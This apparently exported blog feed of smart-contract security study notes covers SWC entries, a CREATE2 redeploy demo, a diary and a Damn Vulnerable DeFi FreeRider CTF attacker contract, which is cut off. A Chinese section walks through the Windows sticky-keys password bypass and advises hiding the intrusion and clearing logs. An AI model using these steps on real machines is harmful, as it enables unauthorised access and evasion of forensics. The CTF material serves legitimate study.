        <content type="html"><![CDATA[<h1 id="Integer-Overflow-and-Underflow"><a href="#Integer-Overflow-and-Underflow" class="headerlink" title="Integer Overflow and Underflow"></a>Integer Overflow and Underflow</h1><p>Integer Overflow and Underflow</p><ul><li><p><strong>Description</strong>:  An overflow/underflow happens when an arithmetic operation reaches the maximum or minimum size of a type. For instance if a number is stored in the uint8 type, it means that the number is stored in a 8 bits unsigned number ranging from 0 to 2^8-1. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits – either larger than the maximum or lower than the minimum representable value.</p></li><li><p><strong>Remediation</strong>: It is recommended to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.SWC-100_Frunction Default Visibility</title>
      <link href="/2023/07/13/09.SWC/00.SWC-100_Frunction%20Default%20Visibility/"/>
      <url>/2023/07/13/09.SWC/00.SWC-100_Frunction%20Default%20Visibility/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-100-Frunction-Default-Visibility"><a href="#SWC-100-Frunction-Default-Visibility" class="headerlink" title="SWC-100_Frunction Default Visibility"></a>SWC-100_Frunction Default Visibility</h1><p>Function Default Visibility</p><ul><li><p><strong>Description</strong>:  Functions that do not have a function visibility type specified are <code>public</code> by default. This can lead to a vulnerability if a developer forgot to set the visibility and a malicious user is able to make unauthorized or unintended state changes.</p></li><li><p><strong>Remediation</strong>: Functions can be specified as being <code>external</code>, <code>public</code>, <code>internal</code> or <code>private</code>. It is recommended to make a conscious decision on which visibility type is appropriate for a function. This can dramatically reduce the attack surface of a contract system.</p></li></ul><p>vulnerable contract:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract HashForEther &#123;</span><br><span class="line"></span><br><span class="line">    function withdrawWinnings() &#123; // fixed: add public</span><br><span class="line">        // Winner if the last 8 hex characters of the address are 0. </span><br><span class="line">        require(uint32(msg.sender) == 0);</span><br><span class="line">        _sendWinnings();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function _sendWinnings() &#123; // fixed: add internal</span><br><span class="line">         msg.sender.transfer(this.balance);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>42.CREATE and CREATE2 redelpoy</title>
      <link href="/2023/07/03/00.security/42.CREATE%20and%20CREATE2%20redelpoy/"/>
      <url>/2023/07/03/00.security/42.CREATE%20and%20CREATE2%20redelpoy/</url>
      
        <content type="html"><![CDATA[<h1 id="CREATE-and-CREATE2-redelpoy"><a href="#CREATE-and-CREATE2-redelpoy" class="headerlink" title="CREATE and CREATE2 redelpoy"></a>CREATE and CREATE2 redelpoy</h1><h2 id="theory"><a href="#theory" class="headerlink" title="theory"></a>theory</h2><p>To begin with, there is an attack event about this article: <a href="https://www.tuoniaox.com/news/p-562673.html">Tornado.Cash DAO attack</a>. Its attack logic is that:</p><p>Using CREATE2 to deploy an contract and returning a address, the rumtimecode will be deployed to EVM. If this contract has a <code>selfdestruct()</code>, it can remove the runtimecode, balance, <strong>nonce</strong> and so on in this address. As we know, the theory of using CREATE to create a contract is:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keccak256(rlp(senderAddress, nonce))[12:31]</span><br></pre></td></tr></table></figure><p>Because the senderAddress isn’t change and nonce is reset to zero again, we can deploy different bytecode in the same address.</p><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>This is all the contract we need.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">contract A&#123;</span><br><span class="line">// _bytecode: contract B</span><br><span class="line">    bytes _bytecode = hex&quot;6080604052600a60005534801561001557600080fd5b50610425806100256000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80630c55699c1461005157806335f469941461006f57806345c8159014610079578063517cf1ca14610097575b600080fd5b6100596100b5565b6040516100669190610172565b60405180910390f35b6100776100bb565b005b6100816100d5565b60405161008e91906101ce565b60405180910390f35b61009f61010a565b6040516100ac91906101ce565b60405180910390f35b60005481565b600073ffffffffffffffffffffffffffffffffffffffff16ff5b6000806040516100e49061013f565b604051809103906000f080158015610100573d6000803e3d6000fd5b5090508091505090565b6000806040516101199061014c565b604051809103906000f080158015610135573d6000803e3d6000fd5b5090508091505090565b610103806101ea83390190565b610103806102ed83390190565b6000819050919050565b61016c81610159565b82525050565b60006020820190506101876000830184610163565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101b88261018d565b9050919050565b6101c8816101ad565b82525050565b60006020820190506101e360008301846101bf565b9291505056fe6080604052600b60005534801561001557600080fd5b5060df806100246000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806335f46994146037578063a56dfe4a14603f575b600080fd5b603d6059565b005b60456073565b604051605091906090565b60405180910390f35b600073ffffffffffffffffffffffffffffffffffffffff16ff5b60005481565b6000819050919050565b608a816079565b82525050565b600060208201905060a360008301846083565b9291505056fea264697066735822122031f4cde3577d87814c482dd53e9673d6b0c8232c6ad9ea609b9c1ed776d8ae3964736f6c634300081000336080604052600c60005534801561001557600080fd5b5060df806100246000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806335f46994146037578063c5d7802e14603f575b600080fd5b603d6059565b005b60456073565b604051605091906090565b60405180910390f35b600073ffffffffffffffffffffffffffffffffffffffff16ff5b60005481565b6000819050919050565b608a816079565b82525050565b600060208201905060a360008301846083565b9291505056fea2646970667358221220b2a0ebd03886067eb14fc3cac337f335ec2f7423f81bb506a317c0ddb7cb419a64736f6c63430008100033a2646970667358221220cb864211dc25005a67499d35383b700ead9a1148c4d299691a4ba5d7ec9c0a0964736f6c63430008100033&quot;;</span><br><span class="line">    </span><br><span class="line">    function deploy(bytes32 _salt) public returns(address)&#123;</span><br><span class="line">        bytes memory bytecode = _bytecode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(_bytecode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B&#123;</span><br><span class="line">    uint256 public x = 10;</span><br><span class="line"></span><br><span class="line">    function die() public&#123;</span><br><span class="line">        selfdestruct(payable(0));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createC_1() public returns(address)&#123;</span><br><span class="line">        C_1 c_1 = new C_1();</span><br><span class="line">        return address(c_1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createC_2() public returns(address)&#123;</span><br><span class="line">        C_2 c_2 = new C_2();</span><br><span class="line">        return address(c_2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract C_1&#123; </span><br><span class="line">    uint256 public y = 11;</span><br><span class="line"></span><br><span class="line">    function die() public&#123;</span><br><span class="line">        selfdestruct(payable(0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract C_2&#123;</span><br><span class="line">    uint256 public z = 12;</span><br><span class="line"></span><br><span class="line">    function die() public&#123;</span><br><span class="line">        selfdestruct(payable(0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Deploy contract A</li><li>calculate bytecodehash and deploy the contract B</li><li>contract B: call <code>createC_1()</code> to deploy C_1, now we can get y in contract C_1. Attention, contract use CREATE to create a contract:  <code>keccak256(rlp(contract B, 0))[12:31]</code>, nonce=0. After that, the nonce turns to 1.</li><li>contract C_1: call <code>die()</code>, and then we can’t get y. Now there is no code in the contract C_1’s address.</li><li>contract B: call <code>die()</code>, now the nonce of contract B is reset to 0 and no code in the contract B’s address.</li><li>use the contract A and the same salt to call <code>deploy()</code>, because the salt and senderAddress are the same, <code>deploy()</code> returns the same address of B in step 5.</li><li>contract B: call <code>createC_2()</code> to deploy C_2. Because <code>keccak256(rlp(contract B, 0))[12:31]</code> is the same as step 3, so CREATE returns the same address of step 3. Now we make it: deploy the same address with different bytecodes by CREATE, CREATE2 and <code>selfdestruct().</code></li></ol><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>By these seven steps, we understand the advanced technique of CREATE, CREATE2 and <code>selfdestruct()</code>. All in all, the main idea is that:</p><ul><li>the same address can be deployed with different bytecode, the code in other words.</li><li>an address can arbitrarily add and remove bytecode.</li></ul>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.Diary @Kernel</title>
      <link href="/2023/07/02/99.coordinate/01.Diary%20@Kernel/"/>
      <url>/2023/07/02/99.coordinate/01.Diary%20@Kernel/</url>
      
        <content type="html"><![CDATA[<h1 id="Diary-Kernel"><a href="#Diary-Kernel" class="headerlink" title="Diary @Kernel"></a>Diary @Kernel</h1><ul><li>14:05 At dormitory 2023-07-02 </li><li><a href="https://www.zhihu.com/question/563874394/answer/3031975064">the article</a></li></ul><p>Just now I read a article, the title is “What is the most fundamental ability of a person”</p><p>His answer is <code>Kernel stability</code>.</p><blockquote><p>In other words, it’s accepting everything to happen, focusing on oneself and respecting everyone’s way of life.</p><p>No matter learning ability, communication skills, professional skills or so on, they are all related to the concentration while the quality of concentration depends on kernel stability.</p><p>The guys whose has a kernel stability are normally keeping these characteristics: a strong will of goal, patience, knowing what he wants and what he don’t want. As a result, he can do work more efficiently and comprehensive. On the contrary, whose kernel is not stable is easy to get irritable and  anxious. Making himself disappointed when getting trouble and then bring extra pressure. As a result, being overwhelmed.</p><p>…..</p></blockquote><p>To be honest, I am the latter. I always get worried, I want to know more, do more and get more but the fact is not good. I want to learn solidity, I want to learn DeFi, I want to learn MEV, I want to …… But nothing I do well…. When I chat with others in the Internet, I get anxious because I can’t understand what they are talking about and how the thing discussed working. Worse, when I see the guys around me learn more than me, can workout what I can’t, even they are younger than me…Be worried</p><p>I know it’s bad for my health, but the fact is it. This article brings me confidence, benefits me a lot. I should learn step by step, be patience and keep a kernel stability.</p><p>The web3 world is noisy, I should be quiet, quiet and quiet.</p>]]></content>
      
      
      <categories>
          
          <category> 99.coordinate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>41.Owner change</title>
      <link href="/2023/06/30/00.security/41.Owner%20change/"/>
      <url>/2023/06/30/00.security/41.Owner%20change/</url>
      
        <content type="html"><![CDATA[<h1 id="Owner-change"><a href="#Owner-change" class="headerlink" title="Owner change"></a>Owner change</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract Owned &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  </span><br><span class="line">  modifier onlyOwner() &#123;</span><br><span class="line">    require(msg.sender == owner);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">    require(newOwner != 0);</span><br><span class="line">    owner = newOwner;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The contract above is unsafe: DoS! What if I call <code>transferOwnership()</code> with 0? The owner can no longer change.</p><p>Fix it: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">contract Owned &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  address public ownerTransf; // temporary storage</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner() &#123;</span><br><span class="line">    require(msg.sender == owner);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">    require(newOwner != 0);</span><br><span class="line">    // Instead of swapping owner, we store the &#x27;newOwner&#x27; address in the &#x27;ownerTransf&#x27; variable.</span><br><span class="line">    ownerTransf = newOwner;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // New functions</span><br><span class="line">  </span><br><span class="line">  // Cancel any on-going transfer.</span><br><span class="line">  function cancelOwnershipTransfer() public onlyOwner &#123;</span><br><span class="line">    ownerTransf = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // Lets the new owner claim ownership.</span><br><span class="line">  function claimOwnership() public &#123;</span><br><span class="line">    require(msg.sender == ownerTransf);</span><br><span class="line">    owner = ownerTransf;</span><br><span class="line">    ownerTransf = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/06/29/02.ChainflagCTF/00.digest/"/>
      <url>/2023/06/29/02.ChainflagCTF/00.digest/</url>
      
        <content type="html"><![CDATA[<h1 id="digest"><a href="#digest" class="headerlink" title="digest"></a>digest</h1><p>site: <a href="https://chainflag.org/">https://chainflag.org/</a></p><p>reference:</p><ul><li><a href="https://bcyng-w.github.io/post/Chain%20Flag">https://bcyng-w.github.io/post/Chain%20Flag</a></li><li><a href="https://s3cunda.github.io/2022/01/10/Chainflag-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.html#bank">https://s3cunda.github.io/2022/01/10/Chainflag-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.html#bank</a></li><li><a href="https://blog.csdn.net/m0_68764244/article/details/128526133?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_68764244/article/details/128526133?spm=1001.2014.3001.5501</a></li><li><a href="https://github.com/chainflag/ctf-blockchain-challenges/tree/main">https://github.com/chainflag/ctf-blockchain-challenges/tree/main</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.5次shift破解系统密码</title>
      <link href="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/"/>
      <url>/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="01-5次shift破解系统密码"><a href="#01-5次shift破解系统密码" class="headerlink" title="01.5次shift破解系统密码"></a>01.5次shift破解系统密码</h1><p>在一些Win7和win10中，未登录系统时存在连续按5次shift漏洞，可以通过补丁来修复此漏洞</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>cmd工具路径：<code>c:\windows\system32\cmd</code></li><li>用户/账户密码存储位置：<code>c:\windows\system32\config\SAM</code></li><li>粘滞键：<code>c:\windows\system32\sethc.exe</code></li><li>修改账户密码：<code>net user 用户名 新密码</code></li></ul><h2 id="破解过程"><a href="#破解过程" class="headerlink" title="破解过程"></a>破解过程</h2><p>1.按五次shift键，弹出一个提示“粘滞键”。</p><p>2.启动电脑，在Windows启动界面加载的时候强制关机</p><p>3.再次启动电脑，直到出现下图(启动修复)，选择启动启动修复</p><p><img src="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230619010023099.png" alt="image-20230619010023099"></p><p>4.遇到启动修复，选择取消！！！</p><p>5.选择查看问题详细信息，点击记事本内容</p><p><img src="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230619011058547.png" alt="image-20230619011058547"></p><p>6.找到sethc程序</p><p><img src="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230619011333749.png" alt="image-20230619011333749"></p><p>7.重命名为任意内容</p><p><img src="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230619011419291.png" alt="image-20230619011419291"></p><p>8.找到cmd，复制粘贴</p><p><img src="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230619011519894.png" alt="image-20230619011519894"></p><p>9.重命名为sethc</p><p><img src="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230619011544251.png" alt="image-20230619011544251"></p><p>10.点击完成</p><p>11.重启电脑，连续按五次shift，从图中的system32可以看出，这是以system用户打开的，即管理员账户打开的</p><p><img src="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230619011729604.png" alt="image-20230619011729604"></p><p>12.重设密码，这里以chenqin为例</p><p><img src="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230619011857520.png" alt="image-20230619011857520"></p><p>13.点击确认即可进入</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>为了防止账户主人知道我们改了密码，我们可以新建用户登录</p><p>1.五次shift</p><p><img src="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230619012208459.png" alt="image-20230619012208459"></p><p>2.重启电脑</p><p><img src="/2023/06/24/06.Windows%20Security/01.5%E6%AC%A1shift%E7%A0%B4%E8%A7%A3%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/image-20230619012256755.png" alt="image-20230619012256755"></p><p>3.干完坏事之后，记得删除此用户哦</p><p>4.后期，还可以继续毁尸灭迹，将log日志也清空</p>]]></content>
      
      
      <categories>
          
          <category> 06.Windows Security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.FreeRider</title>
      <link href="/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/10.FreeRider/"/>
      <url>/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/10.FreeRider/</url>
      
        <content type="html"><![CDATA[<h1 id="FreeRider"><a href="#FreeRider" class="headerlink" title="FreeRider"></a>FreeRider</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><p><strong>First vulnerabilities:</strong> </p><p>the use of the global variable msg.value inside of a loop. The <code>buyMany()</code> function contains a loop that is used to buy several NFTs in a single transaction:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function buyMany(uint256[] calldata tokenIds) external payable</span><br><span class="line">  nonReentrant &#123;</span><br><span class="line">   for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;</span><br><span class="line">      _buyOne(tokenIds[i]);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And in the _buyOne() function called by the buyMany() function, we find the check for the msg.value (line 74):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint256 priceToPay = offers[tokenId];</span><br><span class="line">require(msg.value &gt;= priceToPay, &quot;Amount paid is not enough&quot;);</span><br></pre></td></tr></table></figure><p>But the value is checked for the price of a singular NFT (15 ETH) and not the total value needed (6 * 15 = 90 ETH). This allows the caller of the buyMany() function to re-use the ETH for every NFT purchase. So, in this example, we can buy the 6 NFTs by sending only 15 ETH as the msg.value to the transaction.</p><p><strong>Second vulnerabilities:</strong> </p><p>the FreeRiderNFTMarketplace contract transfers the ETH to the owner of the NFT after transferring the NFT itself. In practice, this means that the address who buys the NFT gets transferred ETH by the FreeRiderNFTMarketplace contract, instead of transferring ETH to the contract:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// transfer from seller to buyer</span><br><span class="line">token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);</span><br><span class="line"></span><br><span class="line">// pay seller</span><br><span class="line">payable(token.ownerOf(tokenId)).sendValue(priceToPay);</span><br></pre></td></tr></table></figure><h2 id="solutions"><a href="#solutions" class="headerlink" title="solutions"></a>solutions</h2><p>Wse need to make an implementation that can execute a flash swap to: get some WETH, change that WETH for ETH, use that ETH to buy the NFTs, change back the ETH for WETH and, finally pay back the flash swap, plus the fee. All of this has to be done in a single transaction and we’d be good to go. Here’s an attacker contract that is capable of doing what we need.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/IERC721.sol&quot;;</span><br><span class="line">import &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;;</span><br><span class="line"></span><br><span class="line">// As interface for avoiding pragma mismatch. Also saves gas.</span><br><span class="line">interface IWETH &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool);</span><br><span class="line">    function withdraw(uint256) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FreeRiderAttacker &#123;</span><br><span class="line">    // Interfaces</span><br><span class="line">    IERC721 private immutable NFT;</span><br><span class="line">    IWETH private immutable WETH;</span><br><span class="line">    IUniswapV2Pair private immutable UNISWAP_PAIR;</span><br><span class="line"></span><br><span class="line">    // Addresses</span><br><span class="line">    address private immutable marketplace;</span><br><span class="line">    address private immutable buyer;</span><br><span class="line">    address private immutable attacker;</span><br><span class="line"></span><br><span class="line">    // Tokens to buy</span><br><span class="line">    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _nft,</span><br><span class="line">        address payable _weth,</span><br><span class="line">        address _pair,</span><br><span class="line">        address payable _marketplace,</span><br><span class="line">        address _buyer</span><br><span class="line">    ) &#123;</span><br><span class="line">        NFT = IERC721(_nft);</span><br><span class="line">        WETH = IWETH(_weth);</span><br><span class="line">        UNISWAP_PAIR = IUniswapV2Pair(_pair);</span><br><span class="line">        marketplace = _marketplace;</span><br><span class="line">        attacker = msg.sender;</span><br><span class="line">        buyer = _buyer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 _amount0) external &#123;</span><br><span class="line">        require(msg.sender == attacker);</span><br><span class="line">        bytes memory _data = &quot;1&quot;;</span><br><span class="line"></span><br><span class="line">        // 1. Do a flash swap to get WETH</span><br><span class="line">        UNISWAP_PAIR.swap(</span><br><span class="line">            _amount0, // amount0 =&gt; WETH</span><br><span class="line">            0, // amount1 =&gt; DVT</span><br><span class="line">            address(this), // recipient of flash swap</span><br><span class="line">            _data // passed to uniswapV2Call function that uniswapPair triggers on the recipient (this)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function called by UniswapPair when making the flash swap</span><br><span class="line">    function uniswapV2Call(</span><br><span class="line">        address,</span><br><span class="line">        uint256 _amount0,</span><br><span class="line">        